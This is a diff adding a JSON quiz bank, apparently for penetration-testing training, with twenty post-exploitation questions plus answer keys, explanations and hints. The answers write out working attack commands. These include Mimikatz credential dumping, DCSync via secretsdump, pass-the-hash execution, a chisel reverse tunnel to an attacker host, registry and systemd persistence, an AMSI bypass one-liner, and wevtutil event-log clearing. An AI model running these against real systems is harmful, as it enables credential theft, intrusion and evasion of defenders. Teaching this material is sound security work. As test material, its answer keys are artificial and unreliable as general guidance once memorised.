@@ -1,0 +1,375 @@
+[
+  {
+    "id": "vq-postex-01",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "easy",
+    "question": "What Mimikatz command dumps plaintext credentials from LSASS memory?",
+    "correct_answers": [
+      "sekurlsa::logonpasswords",
+      "mimikatz sekurlsa::logonpasswords",
+      "privilege::debug sekurlsa::logonpasswords"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "sekurlsa::logonpasswords extracts plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS process memory. Requires SeDebugPrivilege (privilege::debug).",
+    "hints": [
+      "The module is sekurlsa and the command lists logon passwords"
+    ]
+  },
+  {
+    "id": "vq-postex-02",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What impacket tool performs a DCSync attack to extract domain hashes remotely?",
+    "correct_answers": [
+      "secretsdump.py",
+      "impacket-secretsdump",
+      "secretsdump.py -just-dc domain/user:pass@dc-ip",
+      "impacket-secretsdump domain/user@dc"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "secretsdump.py uses the Directory Replication Service (DRS) protocol to perform a DCSync attack, extracting all domain password hashes without running code on the DC. Requires Replicating Directory Changes privileges.",
+    "hints": [
+      "An impacket script that dumps secrets from a domain controller"
+    ]
+  },
+  {
+    "id": "vq-postex-03",
+    "topic_id": "post_exploitation",
+    "type": "theory",
+    "difficulty": "medium",
+    "question": "What is lateral movement in post-exploitation?",
+    "correct_answers": [
+      "Moving from one compromised system to other systems in the network using obtained credentials or exploits",
+      "Pivoting between machines in a network after initial compromise",
+      "Using credentials from one host to access other hosts in the network"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Lateral movement is the technique of using access on one compromised system to gain access to additional systems in the network. Common methods include pass-the-hash, PSExec, WMI, RDP, and SSH with harvested credentials.",
+    "hints": [
+      "Moving sideways through a network from host to host"
+    ]
+  },
+  {
+    "id": "vq-postex-04",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What impacket tool executes commands on a remote Windows host using pass-the-hash?",
+    "correct_answers": [
+      "psexec.py",
+      "wmiexec.py",
+      "smbexec.py",
+      "impacket-psexec domain/user@target -hashes :NTLM_HASH",
+      "psexec.py -hashes :hash domain/user@target"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "impacket's psexec.py, wmiexec.py, and smbexec.py all support pass-the-hash (-hashes LM:NTLM) for remote command execution without knowing the plaintext password.",
+    "hints": [
+      "Impacket has several *exec.py tools that accept hash authentication"
+    ]
+  },
+  {
+    "id": "vq-postex-05",
+    "topic_id": "post_exploitation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You have SYSTEM access on a domain-joined workstation. How would you extract credentials that could give you access to other machines?",
+    "correct_answers": [
+      "Dump LSASS for cached credentials, extract SAM hashes, check for stored credentials in credential manager",
+      "Mimikatz sekurlsa::logonpasswords to dump cached domain creds",
+      "Dump LSASS memory for NTLM hashes and Kerberos tickets",
+      "secretsdump.py LOCAL to dump SAM and cached credentials"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "With SYSTEM access: dump LSASS for cached domain credentials (Mimikatz), extract SAM database hashes, check Credential Manager, look for Kerberos tickets, and search for saved credentials in browsers/config files.",
+    "hints": [
+      "LSASS caches credentials of recently logged-in users"
+    ]
+  },
+  {
+    "id": "vq-postex-06",
+    "topic_id": "post_exploitation",
+    "type": "theory",
+    "difficulty": "hard",
+    "question": "What is a Golden Ticket attack and what is required to perform it?",
+    "correct_answers": [
+      "A forged Kerberos TGT created using the KRBTGT hash that grants access to any service in the domain",
+      "Forged TGT using krbtgt hash for domain-wide access",
+      "Creating a fake Kerberos ticket using the krbtgt account NTLM hash"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "A Golden Ticket is a forged Kerberos TGT created with the KRBTGT account's NTLM hash. It allows impersonation of any user (including Domain Admin) for the ticket's lifetime. Requires: domain SID, domain name, and KRBTGT hash.",
+    "hints": [
+      "It involves forging a Kerberos Ticket Granting Ticket"
+    ]
+  },
+  {
+    "id": "vq-postex-07",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "hard",
+    "question": "What command sets up a SOCKS proxy through a Meterpreter session for pivoting?",
+    "correct_answers": [
+      "use auxiliary/server/socks_proxy",
+      "run autoroute -s subnet",
+      "use socks_proxy",
+      "run post/multi/manage/autoroute"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "In Metasploit, first add a route with autoroute (run autoroute -s 10.10.10.0/24), then start a SOCKS proxy (use auxiliary/server/socks_proxy). Configure proxychains to use the proxy for pivoting tools through the compromised host.",
+    "hints": [
+      "You need to set up routing first, then a SOCKS proxy in Metasploit"
+    ]
+  },
+  {
+    "id": "vq-postex-08",
+    "topic_id": "post_exploitation",
+    "type": "scenario",
+    "difficulty": "medium",
+    "question": "You need to maintain persistent access to a Linux server. Name two common persistence mechanisms.",
+    "correct_answers": [
+      "SSH keys and cron jobs",
+      "Add SSH key to authorized_keys, create a cron job reverse shell",
+      "SSH authorized_keys, cron job, systemd service, .bashrc backdoor",
+      "cron job and SSH key"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Common Linux persistence: add SSH public key to ~/.ssh/authorized_keys, create cron job with reverse shell, add systemd service, modify .bashrc/.profile, create SUID binary, or add a user account.",
+    "hints": [
+      "Think about scheduled tasks and remote access methods"
+    ]
+  },
+  {
+    "id": "vq-postex-09",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "easy",
+    "question": "What Linux command dumps the /etc/shadow file contents (requires root)?",
+    "correct_answers": [
+      "cat /etc/shadow",
+      "sudo cat /etc/shadow",
+      "unshadow /etc/passwd /etc/shadow"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "/etc/shadow contains password hashes for local users. Reading it requires root. The 'unshadow' command combines passwd and shadow files into a format suitable for John the Ripper.",
+    "hints": [
+      "The shadow file is in /etc/ and requires elevated privileges to read"
+    ]
+  },
+  {
+    "id": "vq-postex-10",
+    "topic_id": "post_exploitation",
+    "type": "theory",
+    "difficulty": "medium",
+    "question": "What is the difference between pass-the-hash and pass-the-ticket?",
+    "correct_answers": [
+      "Pass-the-hash uses NTLM hashes for authentication while pass-the-ticket uses stolen Kerberos tickets",
+      "PtH uses NTLM hash, PtT uses Kerberos TGT/TGS",
+      "Pass-the-hash authenticates with NTLM, pass-the-ticket authenticates with Kerberos tickets"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Pass-the-hash (PtH) uses a stolen NTLM hash to authenticate via NTLM protocol. Pass-the-ticket (PtT) uses a stolen Kerberos ticket (TGT or TGS) to authenticate to services. PtT is stealthier as it uses legitimate Kerberos authentication.",
+    "hints": [
+      "One uses NTLM protocol, the other uses Kerberos"
+    ]
+  },
+  {
+    "id": "vq-postex-11",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "hard",
+    "question": "What chisel command sets up a reverse SOCKS proxy through a compromised host?",
+    "correct_answers": [
+      "chisel server -p 8080 --reverse (on attacker) and chisel client ATTACKER:8080 R:socks (on target)",
+      "chisel client attacker:8080 R:socks",
+      "chisel server --reverse -p 8080",
+      "chisel client ATTACKER:PORT R:1080:socks"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Chisel creates TCP tunnels over HTTP. For reverse SOCKS: run 'chisel server -p 8080 --reverse' on the attacker, then 'chisel client ATTACKER:8080 R:socks' on the target. This creates a SOCKS5 proxy on the attacker's port 1080 routing through the target.",
+    "hints": [
+      "The server runs on the attacker with --reverse, the client connects from the target with R:socks"
+    ]
+  },
+  {
+    "id": "vq-postex-12",
+    "topic_id": "post_exploitation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You need to exfiltrate a 500MB database dump from a compromised server without triggering DLP. What techniques could you use?",
+    "correct_answers": [
+      "Compress and encrypt the data, split into small chunks, exfiltrate over DNS, HTTPS, or ICMP tunnels",
+      "Encrypt and chunk the data, use DNS tunneling or steganography, exfil over allowed protocols",
+      "Use dnscat2 for DNS exfiltration, or split into small HTTPS uploads to cloud storage",
+      "Compress, encrypt, encode in base64, exfiltrate via DNS queries or allowed cloud services"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Data exfiltration techniques: compress and encrypt data, split into chunks, use covert channels (DNS tunneling with dnscat2, ICMP tunneling, HTTPS to legitimate cloud services), steganography, or exfiltrate during high-traffic periods to blend in.",
+    "hints": [
+      "Think about encoding data into protocols that are typically allowed through firewalls"
+    ]
+  },
+  {
+    "id": "vq-postex-13",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What registry key and command creates a Windows persistence mechanism that runs a payload at user login?",
+    "correct_answers": [
+      "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\payload.exe",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v name /d payload.exe",
+      "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\payload.exe'"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "The Run registry key (HKCU or HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) executes programs at user login. HKCU requires no admin rights but only triggers for that user. HKLM requires admin but persists for all users.",
+    "hints": [
+      "A well-known registry path under CurrentVersion that auto-runs programs"
+    ]
+  },
+  {
+    "id": "vq-postex-14",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What command creates a Linux persistence mechanism using a systemd service?",
+    "correct_answers": [
+      "Create a .service file in /etc/systemd/system/ with ExecStart pointing to the payload, then systemctl enable it",
+      "systemctl enable malicious.service",
+      "Create /etc/systemd/system/backdoor.service with [Service] ExecStart=/path/to/payload and enable it"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Create a systemd service file in /etc/systemd/system/ with [Unit], [Service] (ExecStart=/payload), and [Install] (WantedBy=multi-user.target) sections. Enable with systemctl enable to start on boot. More reliable than cron for persistence.",
+    "hints": [
+      "Create a service unit file and enable it to start at boot"
+    ]
+  },
+  {
+    "id": "vq-postex-15",
+    "topic_id": "post_exploitation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You have a Meterpreter session on a Windows host and want to impersonate a domain admin token. What commands would you use?",
+    "correct_answers": [
+      "load incognito, list_tokens -u, impersonate_token DOMAIN\\\\Admin",
+      "use incognito then impersonate_token",
+      "load incognito; list_tokens -u; impersonate_token 'DOMAIN\\admin'",
+      "steal_token PID"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "In Meterpreter: 'load incognito' loads the token manipulation module, 'list_tokens -u' shows available delegation tokens, and 'impersonate_token DOMAIN\\\\User' impersonates that user's security context. Alternatively, 'steal_token PID' steals a token from a running process.",
+    "hints": [
+      "Load the incognito module, list available tokens, then impersonate one"
+    ]
+  },
+  {
+    "id": "vq-postex-16",
+    "topic_id": "post_exploitation",
+    "type": "theory",
+    "difficulty": "hard",
+    "question": "What is process injection and why is it used in post-exploitation?",
+    "correct_answers": [
+      "Injecting malicious code into a legitimate process to evade detection, inherit its privileges, and blend in with normal system activity",
+      "Running malicious code inside another process to avoid detection and inherit its access tokens",
+      "Inserting shellcode or DLLs into legitimate processes to evade EDR and maintain stealth"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Process injection inserts malicious code into legitimate processes (explorer.exe, svchost.exe) to: evade EDR/AV detection, inherit the target process's privileges and tokens, survive if the original payload process is killed, and blend with normal system activity. Techniques include DLL injection, process hollowing, and shellcode injection.",
+    "hints": [
+      "Think about hiding malicious code inside trusted processes"
+    ]
+  },
+  {
+    "id": "vq-postex-17",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "hard",
+    "question": "What PowerShell one-liner bypasses AMSI (Antimalware Scan Interface) to run malicious scripts?",
+    "correct_answers": [
+      "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+      "amsiInitFailed",
+      "Set amsiInitFailed to true via reflection",
+      "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) )"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "AMSI bypass techniques set the amsiInitFailed field to true via .NET reflection, making PowerShell believe AMSI initialization failed and skipping script scanning. Note: modern EDR may detect known bypass strings, requiring obfuscation.",
+    "hints": [
+      "The bypass sets a specific field in AmsiUtils to indicate initialization failure"
+    ]
+  },
+  {
+    "id": "vq-postex-18",
+    "topic_id": "post_exploitation",
+    "type": "theory",
+    "difficulty": "medium",
+    "question": "What are LOLBins (Living Off the Land Binaries) and give two examples?",
+    "correct_answers": [
+      "Legitimate system binaries abused for malicious purposes. Examples: certutil, mshta, rundll32, regsvr32, bitsadmin",
+      "Built-in OS binaries used for attacks to avoid detection. certutil for downloads, mshta for script execution",
+      "Native Windows/Linux binaries repurposed for offensive operations. Examples: certutil, powershell, curl, wget"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "LOLBins are legitimate, signed system binaries that can be abused for offensive purposes (download files, execute code, bypass controls). Examples: certutil (download), mshta (execute HTA), rundll32 (load DLLs), bitsadmin (download), regsvr32 (execute scriptlets). They evade application whitelisting since they're trusted binaries.",
+    "hints": [
+      "Trusted system binaries that can be misused for downloading, executing, or bypassing security"
+    ]
+  },
+  {
+    "id": "vq-postex-19",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What commands would you run to clear evidence of your activity from Windows event logs?",
+    "correct_answers": [
+      "wevtutil cl Security && wevtutil cl System && wevtutil cl Application",
+      "wevtutil cl Security",
+      "Clear-EventLog -LogName Security,System,Application",
+      "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\""
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "wevtutil cl clears specific Windows event logs. Clear Security, System, and Application logs to remove evidence. Note: clearing logs itself generates event ID 1102 (audit log cleared), so complete evidence removal is difficult.",
+    "hints": [
+      "Use wevtutil or PowerShell Clear-EventLog to remove log entries"
+    ]
+  },
+  {
+    "id": "vq-postex-20",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "easy",
+    "question": "What commands provide situational awareness on a newly compromised Windows host?",
+    "correct_answers": [
+      "whoami /all, ipconfig /all, net user, net group, systeminfo",
+      "whoami /all && systeminfo && ipconfig /all",
+      "whoami, hostname, ipconfig, net users, net localgroup administrators",
+      "systeminfo && whoami /priv && net user /domain"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Initial situational awareness: whoami /all (current user, groups, privileges), systeminfo (OS version, patches), ipconfig /all (network config), net user/group (local and domain users), net share (shares), arp -a (network neighbors).",
+    "hints": [
+      "Gather information about who you are, what system you're on, and what's around you"
+    ]
+  }
+]
